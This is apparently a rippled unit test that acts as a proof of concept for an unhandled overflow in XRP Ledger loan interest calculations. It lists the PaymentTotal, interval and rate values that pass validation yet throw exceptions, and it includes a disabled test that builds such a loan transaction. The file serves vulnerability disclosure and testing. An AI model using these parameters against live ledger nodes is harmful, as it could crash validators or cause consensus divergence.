//------------------------------------------------------------------------------
/*
    This file is part of rippled: https://github.com/ripple/rippled
    Copyright (c) 2025 Ripple Labs Inc.

    Permission to use, copy, modify, and/or distribute this software for any
    purpose  with  or without fee is hereby granted, provided that the above
    copyright notice and this permission notice appear in all copies.

    THE  SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
    WITH  REGARD  TO  THIS  SOFTWARE  INCLUDING  ALL  IMPLIED  WARRANTIES  OF
    MERCHANTABILITY  AND  FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
    ANY  SPECIAL ,  DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
    WHATSOEVER  RESULTING  FROM  LOSS  OF USE, DATA OR PROFITS, WHETHER IN AN
    ACTION  OF  CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
    OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
//==============================================================================

#include <test/jtx.h>
#include <test/jtx/Env.h>
#include <test/jtx/TestHelpers.h>
#include <test/jtx/loan.h>
#include <xrpld/app/misc/LendingHelpers.h>
#include <xrpl/basics/Number.h>
#include <xrpl/protocol/TxFlags.h>

#include <iostream>

namespace ripple {
namespace test {

class LoanOverflow_test : public beast::unit_test::suite
{
public:
    void
    testPaymentTotalOverflow()
    {
        testcase("Payment Total Overflow - Prove Unhandled Exception");

        using namespace jtx;

        std::cout << "\n========================================" << std::endl;
        std::cout << "TESTING PAYMENT TOTAL OVERFLOW" << std::endl;
        std::cout << "========================================\n" << std::endl;

        // Test different PaymentTotal values to find overflow threshold
        struct TestCase
        {
            std::uint32_t paymentTotal;
            std::uint32_t paymentInterval;  // seconds
            std::uint32_t interestRate;      // tenth bips (100000 = 100%)
            std::string description;
        };

        std::vector<TestCase> testCases = {
            // Safe cases
            {100, 86400, 100000, "Safe: 100 payments, daily, 100% rate"},
            {1000, 86400, 100000, "Safe: 1000 payments, daily, 100% rate"},
            {5000, 86400, 100000, "Moderate: 5000 payments, daily, 100% rate"},

            // Boundary cases
            {10000, 86400, 100000, "High: 10k payments, daily, 100% rate"},
            {20000, 86400, 100000, "Higher: 20k payments, daily, 100% rate"},
            {30000, 86400, 100000, "Very High: 30k payments, daily, 100% rate"},
            {40000, 86400, 100000, "OVERFLOW EXPECTED: 40k payments, daily, 100% rate"},

            // Weekly intervals
            {1000, 604800, 100000, "Safe: 1k payments, weekly, 100% rate"},
            {5000, 604800, 100000, "High: 5k payments, weekly, 100% rate"},
            {7000, 604800, 100000, "OVERFLOW EXPECTED: 7k payments, weekly, 100% rate"},
        };

        for (auto const& tc : testCases)
        {
            std::cout << "\n----------------------------------------" << std::endl;
            std::cout << "TEST: " << tc.description << std::endl;
            std::cout << "  PaymentTotal: " << tc.paymentTotal << std::endl;
            std::cout << "  PaymentInterval: " << tc.paymentInterval << " seconds" << std::endl;
            std::cout << "  InterestRate: " << tc.interestRate << " (tenth bips)" << std::endl;

            // Calculate periodicRate
            Number const paymentInterval(tc.paymentInterval);
            Number const interestRateNum(tc.interestRate);
            Number const secondsPerYear(365 * 24 * 60 * 60); // 31,536,000

            Number const periodicRate =
                (paymentInterval * interestRateNum) / (Number(100000) * secondsPerYear);

            std::cout << "  Calculated periodicRate: " << periodicRate << std::endl;
            std::cout << "  Exponent: " << periodicRate.exponent() << std::endl;
            std::cout << "  Mantissa: " << periodicRate.mantissa() << std::endl;

            // Try to compute power(1 + periodicRate, paymentTotal)
            Number const base = Number(1) + periodicRate;
            std::cout << "  Base (1 + periodicRate): " << base << std::endl;
            std::cout << "  Need to compute: power(" << base << ", " << tc.paymentTotal << ")" << std::endl;

            // Estimate the result
            double const estimate = std::exp(
                tc.paymentTotal * std::log(static_cast<double>(base.mantissa()) / 1e15));
            std::cout << "  Estimated result magnitude: ~e^"
                      << (tc.paymentTotal * std::log(static_cast<double>(base.mantissa()) / 1e15))
                      << " = ~" << estimate << std::endl;

            bool overflowed = false;
            std::string errorMsg;

            try
            {
                std::cout << "  Attempting power() calculation..." << std::endl;
                Number result = power(base, tc.paymentTotal);
                std::cout << "  ✓ SUCCESS: power() returned " << result << std::endl;
                std::cout << "    Result exponent: " << result.exponent() << std::endl;
                std::cout << "    Result mantissa: " << result.mantissa() << std::endl;
            }
            catch (std::overflow_error const& e)
            {
                overflowed = true;
                errorMsg = e.what();
                std::cout << "  ✗ OVERFLOW EXCEPTION CAUGHT!" << std::endl;
                std::cout << "    Exception: " << errorMsg << std::endl;
            }
            catch (std::exception const& e)
            {
                overflowed = true;
                errorMsg = e.what();
                std::cout << "  ✗ OTHER EXCEPTION: " << errorMsg << std::endl;
            }

            // Now test if this would pass time-based validation
            constexpr std::uint32_t UINT32_MAX_VAL = 4294967295u;
            std::uint32_t const timeAvailable = UINT32_MAX_VAL - 1000000; // assume ledger started at 1M
            bool passesTimeCheck = (timeAvailable / tc.paymentInterval >= tc.paymentTotal);

            std::cout << "  Time check: (" << timeAvailable << " / " << tc.paymentInterval
                      << ") >= " << tc.paymentTotal << std::endl;
            std::cout << "    = " << (timeAvailable / tc.paymentInterval)
                      << " >= " << tc.paymentTotal << " ? "
                      << (passesTimeCheck ? "PASS" : "FAIL") << std::endl;

            if (overflowed && passesTimeCheck)
            {
                std::cout << "\n  ⚠️  VULNERABILITY CONFIRMED!" << std::endl;
                std::cout << "      - Passes time-based validation ✓" << std::endl;
                std::cout << "      - Causes unhandled overflow exception ✗" << std::endl;
                std::cout << "      - This can cause consensus divergence!" << std::endl;
            }

            std::cout << "----------------------------------------" << std::endl;
        }

        std::cout << "\n========================================" << std::endl;
        std::cout << "TEST COMPLETE" << std::endl;
        std::cout << "========================================\n" << std::endl;
    }

    void
    testActualLoanCreation()
    {
        testcase("Actual Loan Creation with Large PaymentTotal");

        using namespace jtx;

        std::cout << "\n========================================" << std::endl;
        std::cout << "TESTING ACTUAL LOAN CREATION" << std::endl;
        std::cout << "========================================\n" << std::endl;

        Env env(*this);
        auto const alice = Account("alice");
        auto const bob = Account("bob");

        env.fund(XRP(10000), alice, bob);
        env.close();

        std::cout << "Setting up vault and broker..." << std::endl;

        // Create vault
        auto const USD = alice["USD"];
        env(vault::set(alice, USD, alice));
        env.close();
        auto const vaultID = env.le(keylet::vault(alice, USD))->at(sfVaultID);

        std::cout << "  Vault created: " << to_string(vaultID) << std::endl;

        // Fund vault
        env(vault::fund(alice, vaultID, USD(10000)));
        env.close();

        // Create broker
        env(broker::set(alice, vaultID));
        env.close();
        auto const brokerID = env.le(keylet::loanbroker(alice, 0))->at(sfLoanBrokerID);

        std::cout << "  Broker created: " << to_string(brokerID) << std::endl;

        // Deposit cover
        env(broker::coverDeposit(alice, brokerID, USD(1000)));
        env.close();

        std::cout << "\nAttempting to create loan with PaymentTotal=40000..." << std::endl;

        // Try to create a loan with parameters that should overflow
        try
        {
            env(loan::set(bob, brokerID, USD(1000))
                ["PaymentTotal"](40000)
                ["PaymentInterval"](86400)  // 1 day
                ["InterestRate"](100000),   // 100% annual
                sig(sfCounterpartySignature, alice),
                ter(tesSUCCESS)); // We expect this to either succeed or fail gracefully

            env.close();

            std::cout << "  ✓ Transaction succeeded (unexpected - overflow should occur)" << std::endl;
        }
        catch (std::exception const& e)
        {
            std::cout << "  ✗ EXCEPTION THROWN: " << e.what() << std::endl;
            std::cout << "  This proves the vulnerability - unhandled exception in transaction processing!" << std::endl;
        }

        std::cout << "\n========================================\n" << std::endl;
    }

    void
    run() override
    {
        testPaymentTotalOverflow();
        // Uncomment to test actual loan creation (may crash if exception is truly unhandled)
        // testActualLoanCreation();
    }
};

BEAST_DEFINE_TESTSUITE(LoanOverflow, app, ripple);

}  // namespace test
}  // namespace ripple
